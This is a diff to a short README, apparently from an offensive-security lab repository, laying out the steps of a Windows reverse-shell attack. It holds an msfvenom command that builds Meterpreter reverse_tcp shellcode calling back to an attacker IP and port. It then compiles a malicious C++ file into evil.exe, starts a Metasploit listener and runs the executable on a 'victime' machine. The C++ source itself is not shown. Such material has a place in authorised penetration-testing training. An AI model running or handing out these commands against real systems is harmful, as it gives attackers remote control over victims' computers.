@@ -1,9 +1,9 @@
 # Attacker server
 - Create malicious shellcode by msfvenom
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.138 LPORT=4444 -f c
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.138 LPORT=4444 -f c > shellcode.txt
 ```
-- Create a C++ file that find explorer.exe to inject shellcode into it APC Queue
+- Create a malicious C++ file
 - Compile exe file from C++ file:
 ```bash
 x86_64-w64-mingw32-g++ -o evil.exe evil.cpp -static-libgcc -static-libstdc++
@@ -16,5 +16,5 @@ msfconsole -x "use exploits/multi/handler; set lhost 192.168.119.138; set lport 
 
 # Victime machine
 ```bash
-.\evil.exe PID
+.\evil.exe
 ```
